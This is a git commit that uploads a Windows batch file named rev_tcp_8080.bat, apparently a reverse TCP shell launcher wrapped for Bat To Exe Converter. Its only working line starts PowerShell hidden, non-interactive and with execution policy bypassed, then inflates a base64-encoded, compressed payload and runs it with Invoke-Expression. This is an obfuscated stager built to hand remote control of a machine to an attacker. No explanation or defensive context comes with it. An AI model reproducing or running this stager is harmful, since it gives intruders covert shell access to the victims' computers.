981db74c368bf0e1970e6d510225ee09103054c6
Raghul-1908 <srm.raghulsri@gmail.com>
2025-04-01 20:43:54 +0530

    Add files via upload

---
+++ rev_tcp_8080.bat
@@ -0,0 +1,35 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdG8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSzk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSTk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+IeA==
+::cxY6rQJ7JhzQF1fEqQJjZkkaHWQ=
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQI5JRpTSWQ=
+::eg0/rx1wNQPfEVWB+kM9LVsJDAKDMWK2H4oM4Ofv4Io=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFAhHQQWGACWsFbYT7O3H6eOLp14hRPAwcrPX07qbONwB71PbYZU9hDRfgM5s
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+%WinDir%\syswow64\windowspowershell\v1.0\powershell.exe -NoProfile -Noninteractive -WindowStyle Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"zVbbbts4EH3XVxCGgEi1JFC2k83GMNBc1l1jGzeo3fZBMBaMRNvc0KRAUomV1P/eYSxf5GSLoA+LhR4oD89cNHNmxm6Keuh9w0muOB8scqmM17ijSlDebkUZ5w1/gvLilrMUaUMMHHRp4B4NhLkxCn1lyhSEn3MuU6+SPQSoYMKgZXWW1fnod3/Zz6WixNDxHI5s46eo7N4HaOe5etvzXUms98Z7h0097wM14bfrwafbf2hqUHjJidboGxPt1t83SqZUa6n8aFgsbqn6NP0oZywlfHujUTijKPbRk5NclIYmk4k7HN+MFRF6wUwviN91Trv7ogRPengZX3S3eE1TKbJDlbp0q+UKeZ5a3z13Srim3bEqn9yRTO+o6Q3pQ1h9yJCaaC3V1ekl+7LzLFNgpU8WjJeTszNIDFUAeJDqLkheao/LnALsaqbIon4PuTAylbxCfMlyv1sFFF1KISAa76jQUS4lj4TJI6lmR0Hcavvd5Ktk2WQDHlGRefupOgR8pill97SOWaXEpPOnvbwYVdBV11WFGEtDeA93+1L9QdK55w5ERpeICVSrSAdHUac98Z92Otu3d63jk+ZaD2xOmdJmzBa05+3l+sqyEYRe/DvGQQwPfn6SzcVfTGQ2NSb1fZv5a8Y5WxdYe8kXyP1JZ+LtfMYYY0COnhHdkSHKhCNOaY5CjVrrkoN/m5b/Uc2riN5Y9A16XfU621+AtpU/xO2ccqmp96tsOGi2txICBgjy/jsmoBDtGPg8eFoolAptv9aOIWPJoWGQ74U1KrWhi+hlhZGXvHL3U56g1zRqfBkZGMyL14EHxBmnue+4ekeZuPVbhOGJjwJ0ik+xj74jWZhQFJx3kZvDdyXnShEb1noNDATsCJFSr3EL87QRoI4PwCUAwe6WN/mBoUe4x45bvsFecsEMxHdPFWTBxiwhH+0W2Ayw3zy23koYz9bg8qLvPMwZp8gDDyE3P1eGctlImvVQy8B9bB4Ddf490X1OZhqsDaWgPlo5UyCB57JeDLEw8EtRx741m+ABgnOZjW5j7iAi2H92EQH7YEXCMor+JCLj1AetMJ6sHNeALjAitCVD4YLaRXhFp0wwwyT0TorCIQE+Np6XZgOFAn7pnKR0vUb7hUgtElZlDrvVzFVhCwSdeXZW+8eAA7eMPlIxM/MAL9vAfDg62Hc2kX8uhAHmR898lPmIqnsGtI+uidJzwm0JZV7aDCIMdVvveuimZbRJu+8HaOsEmGc2Va/+TNhedZfrpq0zpjaEq3Y8PelgXE2c1cpZOT8A\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();"
